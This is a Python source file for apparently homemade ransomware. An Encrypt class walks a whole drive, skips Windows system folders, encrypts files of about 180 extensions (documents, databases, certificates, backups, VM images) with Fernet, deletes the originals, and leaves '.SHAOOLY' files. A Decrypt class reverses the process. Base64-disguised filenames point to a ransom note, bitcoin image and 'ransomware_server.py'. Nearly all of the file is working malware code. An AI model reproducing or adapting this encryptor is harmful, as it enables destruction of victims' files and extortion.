from threading import Thread
import os
from cryptography.fernet import Fernet


class Encrypt(Thread):

    def __init__(self, cur_drive, key):
        Thread.__init__(self)
        self.drive = cur_drive
        self.fernet = Fernet(key)  # Generate a Fernet type object
        self.accepted_extensions = [
                                    "JPG",
                                    "Sxw",
                                    "stw",
                                    "uot",
                                    "3ds",
                                    "max",
                                    "3dm",
                                    "ods",
                                    "ots",
                                    "der",
                                    "pfx",
                                    "key",
                                    "crt",
                                    "csr",
                                    "p12",
                                    "pem",
                                    "odt",
                                    "ott",
                                    "sxc",
                                    "stc",
                                    "dif",
                                    "slk",
                                    "wb2",
                                    "odp",
                                    "otp",
                                    "sxd",
                                    "std",
                                    "uop",
                                    "odg",
                                    "otg",
                                    "sxm",
                                    "mml",
                                    "lay",
                                    "lay6",
                                    "asc",
                                    "sqlite3",
                                    "sqlitedb",
                                    "sql",
                                    "accdb",
                                    "mdb",
                                    "dbf",
                                    "odb",
                                    "frm",
                                    "myd",
                                    "myi",
                                    "ibd",
                                    "mdf",
                                    "ldf",
                                    "sln",
                                    "suo",
                                    "cpp",
                                    "pas",
                                    "asm",
                                    "cmd",
                                    "bat",
                                    "ps1",
                                    "vbs",
                                    "dip",
                                    "dch",
                                    "sch",
                                    "brd",
                                    "jsp",
                                    "php",
                                    "asp",
                                    "java",
                                    "jar",
                                    "class",
                                    "mp3",
                                    "wav",
                                    "swf",
                                    "fla",
                                    "wmv",
                                    "mpg",
                                    "vob",
                                    "mpeg",
                                    "asf",
                                    "avi",
                                    "mov",
                                    "mp4",
                                    "3gp",
                                    "mkv",
                                    "3g2",
                                    "flv",
                                    "wma",
                                    "mid",
                                    "m3u",
                                    "m4u",
                                    "djvu",
                                    "svg",
                                    "psd",
                                    "nef",
                                    "tiff",
                                    "tif",
                                    "cgm",
                                    "raw",
                                    "gif",
                                    "png",
                                    "bmp",
                                    "jpg",
                                    "jpeg",
                                    "vcd",
                                    "iso",
                                    "backup",
                                    "zip",
                                    "vmdk",
                                    "vdi",
                                    "sldm",
                                    "sldx",
                                    "sti",
                                    "sxi",
                                    "602",
                                    "hwp",
                                    "snt",
                                    "onetoc2",
                                    "dwg",
                                    "pdf",
                                    "wk1",
                                    "wks",
                                    "123",
                                    "rtf",
                                    "csv",
                                    "txt",
                                    "vsdx",
                                    "vsd",
                                    "edb",
                                    "eml",
                                    "msg",
                                    "ost",
                                    "pst",
                                    "potm",
                                    "potx",
                                    "ppam",
                                    "ppsx",
                                    "ppsm",
                                    "pps",
                                    "pot",
                                    "pptm",
                                    "pptx",
                                    "ppt",
                                    "xltm",
                                    "xltx",
                                    "xlc",
                                    "xlm",
                                    "xlt",
                                    "xlw",
                                    "xlsb",
                                    "xlsm",
                                    "xlsx",
                                    "xls",
                                    "dotx",
                                    "dotm",
                                    "dot",
                                    "docm",
                                    "docb",
                                    "docx",
                                    "doc",
                                    "rar",
                                    "tgz",
                                    "tar",
                                    "bak",
                                    "tbk",
                                    "bz2",
                                    "PAQ",
                                    "ARC",
                                    "aes",
                                    "gpg",
                                    "vmx",
                                    ]  # List all extensions
        self.max_size = 1500000000  # A single file being over 1.5 GB is simply not ideal and would never hold important data
        self.my_files = ['cmFuc29tbm90ZQ==.txt',
                         'cmVk.png', 'eW9r.png',
                         'eW9rMg==.png', 'main.py',
                         'ransomware_server.py',
                         'README.md',
                         'Y29tcHV0ZXJfYmFja2dyb3VuZA==.jpeg',
                         'Y2xhc3MgYWxlcnQ=.PNG',
                         'Yml0Y29pbg==.png',
                         'Z3JlZW4=.png', 'main', 'main.exe']  # The files that need to run with the System.
        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
                        'swapfile.sys', 'System Volume Information', 'Windows'}

    def run(self):  # Override the Thread(run) function.
        for root, dirs, filenames in os.walk(self.drive, topdown=True):  # Start scanning a single drive
            dirs[:] = [d for d in dirs if d not in self.exclude]  # Exclude folders that shouldn't be entered.
            for file in filenames:
                if file.split(".")[-1] in self.accepted_extensions and file not in self.my_files:
                    filepath = os.path.join(root, file)
                    file_extension = file.split(".")[-1]
                    file_name = file.split(".")[0]
                    enc_file_name = f'{root}/{file_name}.SHAOOLY'
                    if os.path.getsize(filepath) < self.max_size and 'ShaulWare' not in filepath:
                        try:
                            with open(filepath, 'rb') as byte_file:
                                enc_file_content = self.fernet.encrypt(byte_file.read())
                            os.remove(filepath)
                            with open(enc_file_name, 'x') as encrypted_file:  # Encrypt
                                encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                        except FileExistsError as _fileExists:
                            index = 0
                            while True:
                                index += 1
                                try:
                                    enc_file_name = f'{root}/{file_name}({index}).SHAOOLY'
                                    with open(enc_file_name, 'x') as encrypted_file:
                                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                                    break
                                except FileExistsError as _fileExits:
                                    pass
                        except OSError as _OsError:
                            pass
                        except ValueError as _ValueError:
                            pass
            # if stop_thread.is_set():  # Break if the Encrypting hasn't finished but the decrypting has started.
            #     break


class Decrypt(Thread):
    def __init__(self, cur_drive, key):
        Thread.__init__(self)
        self.drive = cur_drive
        self.fernet = Fernet(key)
        self.exclude = {'$Recycle.Bin', '$WinREAgent', 'Documents and Settings', 'DumpStack.log.tmp',
                        'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery',
                        'swapfile.sys', 'System Volume Information', 'Windows'}

    def run(self):
        print(f"Started decrypting drive {self.drive}")
        for r, dirs, f in os.walk(self.drive):
            dirs[:] = [d for d in dirs if d not in self.exclude]
            for file in f:
                filepath = os.path.join(r, file)
                filename = filepath.split('/')[-1].split('.')[0]
                if filepath.split('/')[-1].split('.')[-1] == "SHAOOLY":
                    with open(filepath, 'r') as enc_file:
                        file_content = enc_file.read().split('\n')
                    ext = file_content[0]
                    file_name_with_ext = f'{filename}.{ext}'
                    try:
                        with open(file_name_with_ext, 'wb') as dec_file:
                            dec_file.write(self.fernet.decrypt(file_content[1].encode()))
                        os.remove(filepath)
                    except OSError as _osException:
                        pass


if __name__ == '__main__':
    with open('communication_encryption_key.txt', 'rb') as key:
        symmetric = key.read()
    z = Decrypt(cur_drive=r"C:\Users\shaoo\Desktop\dfadf", key=symmetric)
    z.start()
